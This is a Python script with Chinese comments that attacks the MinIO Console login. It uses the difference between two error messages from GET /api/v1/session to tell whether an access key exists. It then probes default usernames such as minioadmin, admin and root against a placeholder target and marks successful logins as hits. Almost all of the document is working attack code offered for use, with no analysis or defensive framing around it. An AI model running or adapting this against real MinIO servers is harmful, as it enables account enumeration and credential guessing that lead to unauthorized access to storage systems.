#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MinIO Console 两段式登录逆向 + Access Key 用户名枚举
原理：
  POST /api/v1/login 对【任意凭据】都返回 204 并下发匿名 token cookie，
  真正的凭据校验发生在【带 cookie 的 GET /api/v1/session】。
  两种错误语义可区分 AK 是否存在：
    - AK 不存在 → 401 {"detailedMessage":"The Access Key Id you provided does not exist in our records."}
    - AK 存在但 SK 错 → 500 {"detailedMessage":"The security token included in the request is invalid"}
"""
import http.client, json

HOST = "TARGET_HOST"; PORT = 9001   # MinIO Console 端口（默认 9001）

def attempt(ak, sk):
    # 第一段：拿 token（任意凭据都给）
    c = http.client.HTTPConnection(HOST, PORT, timeout=10)
    c.request("POST", "/api/v1/login",
              json.dumps({"accessKey": ak, "secretKey": sk, "sts": "off"}),
              {"Content-Type": "application/json", "Connection": "close"})
    r = c.getresponse(); r.read()
    ck = r.getheader("Set-Cookie", "")
    c.close()
    if not ck:
        return ("NOLOGIN", None)
    tok = ck.split(";")[0]
    # 第二段：用 token 验 session（真正校验点）
    c2 = http.client.HTTPConnection(HOST, PORT, timeout=10)
    c2.request("GET", "/api/v1/session", None,
               {"Cookie": tok, "Connection": "close"})
    r2 = c2.getresponse(); d2 = r2.read().decode("utf-8", "ignore")
    c2.close()
    if "does not exist" in d2:
        return ("AK_NOT_EXIST", d2)
    if r2.status == 200:
        return ("HIT", d2)            # 登录成功
    return ("AK_EXISTS_SK_WRONG", d2) # AK 存在，SK 错误

if __name__ == "__main__":
    for ak in ["minioadmin", "admin", "root", "任意待测用户名"]:
        print(f"{ak} -> {attempt(ak, 'probe')}")
